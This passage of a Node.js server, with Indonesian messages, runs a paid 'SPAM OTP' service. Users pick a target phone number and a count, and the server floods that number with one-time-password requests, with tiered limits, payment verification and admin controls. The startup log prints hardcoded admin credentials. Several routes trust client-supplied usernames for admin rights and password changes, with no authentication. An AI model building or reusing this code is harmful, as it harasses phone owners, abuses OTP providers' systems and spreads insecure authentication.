            return res.json({ success: false, message: 'Username dan password wajib diisi!' });
        }
        
        const user = db.users.find(u => u.username === username);
        if (!user) {
            return res.json({ success: false, message: 'Username tidak ditemukan!' });
        }
        
        if (!bcrypt.compareSync(password, user.password)) {
            return res.json({ success: false, message: 'Password salah!' });
        }
        
        user.online = true;
        saveDB();
        io.emit('userStatusChanged', { username, online: true });
        
        res.json({
            success: true,
            user: {
                username: user.username,
                status: user.status,
                limit: user.limit,
                used: user.used,
                isAdmin: user.isAdmin,
                isDeveloper: user.isDeveloper,
                isReseller: user.isReseller
            }
        });
    } catch (err) {
        res.json({ success: false, message: 'Terjadi kesalahan server!' });
    }
});

app.get('/api/user/:username', (req, res) => {
    try {
        const user = db.users.find(u => u.username === req.params.username);
        if (!user) return res.json({ success: false });
        res.json({
            success: true,
            user: {
                username: user.username,
                status: user.status,
                limit: user.limit,
                used: user.used,
                isAdmin: user.isAdmin,
                isDeveloper: user.isDeveloper,
                isReseller: user.isReseller
            }
        });
    } catch (err) {
        res.json({ success: false });
    }
});

app.post('/api/change-password', (req, res) => {
    try {
        const { username, newPassword } = req.body;
        const user = db.users.find(u => u.username === username);
        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
        if (!newPassword || newPassword.length < 4) {
            return res.json({ success: false, message: 'Password minimal 4 karakter!' });
        }
        user.password = bcrypt.hashSync(newPassword, 10);
        saveDB();
        res.json({ success: true, message: 'Password berhasil diubah!' });
    } catch (err) {
        res.json({ success: false, message: 'Terjadi kesalahan!' });
    }
});

// ===== SPAM OTP =====
app.post('/api/spam/otp', async (req, res) => {
    try {
        const { username, target, count } = req.body;
        
        if (!username) {
            return res.json({ success: false, message: 'Username tidak ditemukan!' });
        }
        
        const user = db.users.find(u => u.username === username);
        if (!user) {
            return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
        }
        
        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
            return res.json({ 
                success: false, 
                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan.',
                maintenance: true
            });
        }
        
        if (!target) {
            return res.json({ success: false, message: 'Nomor target wajib diisi!' });
        }
        
        if (!count || count < 1) {
            return res.json({ success: false, message: 'Jumlah minimal 1!' });
        }
        
        const limits = {
            'Free': 15,
            'Premium': 80,
            'VIP': 150,
            'Reseller': 200,
            'Developer': Infinity
        };
        
        const maxLimit = limits[user.status] || 15;
        
        if (user.limit !== Infinity && user.limit !== '∞' && user.limit !== null) {
            if (count > maxLimit) {
                return res.json({ success: false, message: `Maksimal spam untuk ${user.status} adalah ${maxLimit}x!` });
            }
            
            const remaining = user.limit - (user.used || 0);
            if (remaining <= 0) {
                return res.json({ success: false, message: 'Limit spam habis! Tunggu 1 jam untuk reset.' });
            }
            if (count > remaining) {
                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
            }
        }

        const sessionId = `otp_${username}_${Date.now()}`;
        const result = await spamOTP(target, count, username, sessionId);
        
        if (result.success > 0) {
            user.used = (user.used || 0) + result.success;
            saveDB();
            io.emit('userUpdated', { username: user.username });
        }
        
        res.json({ 
            success: true, 
            result: {
                success: result.success,
                failed: result.failed,
                total: result.success + result.failed,
                details: result.details
            }
        });
    } catch (err) {
        console.error('❌ Error spam OTP:', err);
        res.json({ success: false, message: err.message || 'Terjadi kesalahan server!' });
    }
});

// ============================================
// ADMIN API
// ============================================
app.get('/api/admin/users', (req, res) => {
    try {
        res.json({
            success: true,
            users: db.users.map(u => ({
                username: u.username,
                status: u.status,
                limit: u.limit === Infinity ? '∞' : u.limit,
                used: u.used,
                online: u.online || false,
                isAdmin: u.isAdmin,
                isDeveloper: u.isDeveloper,
                isReseller: u.isReseller
            }))
        });
    } catch (err) {
        res.json({ success: false, users: [] });
    }
});

app.post('/api/admin/update-status', (req, res) => {
    try {
        const { username, status, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isDeveloper) {
            return res.json({ success: false, message: 'Hanya Developer!' });
        }
        const user = db.users.find(u => u.username === username);
        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
        
        const limits = { 
            'Free': 15, 
            'Premium': 80, 
            'VIP': 150, 
            'Reseller': 200, 
            'Developer': Infinity 
        };
        
        user.status = status;
        user.limit = limits[status] || 15;
        user.used = 0;
        user.isReseller = (status === 'Reseller');
        user.isAdmin = (status === 'Developer');
        user.isDeveloper = (status === 'Developer');
        saveDB();
        io.emit('userUpdated', { username, action: 'status_change' });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.post('/api/admin/ban', (req, res) => {
    try {
        const { username, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isDeveloper) {
            return res.json({ success: false, message: 'Hanya Developer!' });
        }
        db.users = db.users.filter(u => u.username !== username);
        saveDB();
        io.emit('userUpdated', { username, action: 'banned' });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.post('/api/admin/settings', (req, res) => {
    try {
        const { settings, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isDeveloper) {
            return res.json({ success: false, message: 'Hanya Developer!' });
        }
        db.settings = settings;
        saveDB();
        io.emit('settingsUpdated', { settings });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.get('/api/admin/payments', (req, res) => {
    try {
        res.json({ success: true, payments: db.payments || [] });
    } catch (err) {
        res.json({ success: false, payments: [] });
    }
});

app.post('/api/admin/verify-payment', (req, res) => {
    try {
        const { paymentId, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isAdmin) {
            return res.json({ success: false, message: 'Unauthorized!' });
        }
        const payment = db.payments.find(p => p.id === paymentId);
        if (!payment) return res.json({ success: false, message: 'Payment tidak ditemukan!' });
        payment.status = 'verified';
        const user = db.users.find(u => u.username === payment.username);
        if (user) {
            const limits = { Premium: 80, VIP: 150, Reseller: 200 };
            user.status = payment.package;
            user.limit = limits[payment.package] || 15;
            user.used = 0;
            user.isReseller = (payment.package === 'Reseller');
        }
        saveDB();
        io.emit('paymentStatus', { status: 'success', message: `Pembayaran ${payment.package} diverifikasi!` });
        io.emit('userUpdated', { username: payment.username, action: 'payment_verified' });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.post('/api/admin/reject-payment', (req, res) => {
    try {
        const { paymentId, reason, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isAdmin) {
            return res.json({ success: false, message: 'Unauthorized!' });
        }
        const payment = db.payments.find(p => p.id === paymentId);
        if (!payment) return res.json({ success: false, message: 'Payment tidak ditemukan!' });
        payment.status = 'rejected';
        payment.reason = reason;
        saveDB();
        io.emit('paymentStatus', { status: 'error', message: `Pembayaran dibatalkan: ${reason}` });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ===== PAYMENT SUBMIT =====
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
    filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
});
const upload = multer({ storage });

app.post('/api/payments/submit', upload.single('proof'), (req, res) => {
    try {
        const { username, package: pkg, name, paymentMethod } = req.body;
        const user = db.users.find(u => u.username === username);
        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
        if (!req.file) return res.json({ success: false, message: 'Upload bukti pembayaran!' });
        if (!db.payments) db.payments = [];
        db.payments.push({
            id: uuidv4(),
            username,
            package: pkg,
            amount: pkg === 'Premium' ? 10000 : pkg === 'VIP' ? 20000 : 30000,
            name,
            paymentMethod,
            proof: req.file.filename,
            status: 'pending',
            createdAt: new Date().toISOString()
        });
        saveDB();
        io.emit('paymentSubmitted', { username, package: pkg });
        res.json({ success: true, message: 'Pembayaran terkirim!' });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ============================================
// SOCKET.IO
// ============================================
const onlineUsers = new Set();

io.on('connection', (socket) => {
    console.log('⚡ User connected:', socket.id);

    socket.on('userOnline', (username) => {
        onlineUsers.add(username);
        const user = db.users.find(u => u.username === username);
        if (user) user.online = true;
        saveDB();
        io.emit('usersOnline', Array.from(onlineUsers));
        io.emit('userStatusChanged', { username, online: true });
    });

    socket.on('sendMessage', (data) => {
        if (!db.messages) db.messages = [];
        db.messages.push(data);
        if (db.messages.length > 1000) db.messages.shift();
        saveDB();
        io.emit('newMessage', data);
    });

    socket.on('disconnect', () => {
        console.log('⚡ User disconnected:', socket.id);
    });
});

// ===== RESET LIMIT SETIAP 1 JAM =====
setInterval(() => {
    const now = Date.now();
    db.users.forEach(user => {
        if (user.limit !== Infinity && user.limit !== '∞') {
            if (user.lastReset && (now - user.lastReset) >= 3600000) {
                user.used = 0;
                user.lastReset = now;
                console.log(`🔄 Reset limit untuk ${user.username}`);
            }
            if (!user.lastReset) {
                user.lastReset = now;
                user.used = 0;
            }
        }
    });
    saveDB();
    io.emit('usersUpdated', {});
}, 60000);

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log('========================================');
    console.log('👑 Admin: Lynzka / Asiafone11');
    console.log('📱 SPAM OTP & SUNTIK READY!');
    console.log('========================================');
    console.log(`🔥 ${otpServices.length} API OTP Services`);
    console.log(`🔥 ${freeServices.length} Platform Suntik Services`);
    console.log('========================================');
    console.log('📊 Limit per status:');
    console.log('   Free     : 15x');
    console.log('   Premium  : 80x');
    console.log('   VIP      : 150x');
    console.log('   Reseller : 200x');
    console.log('   Developer: Unlimited');
    console.log('========================================');
    console.log('⏰ Reset limit setiap 1 jam');
    console.log('========================================');
    console.log('✅ All done!');
    console.log('========================================');
});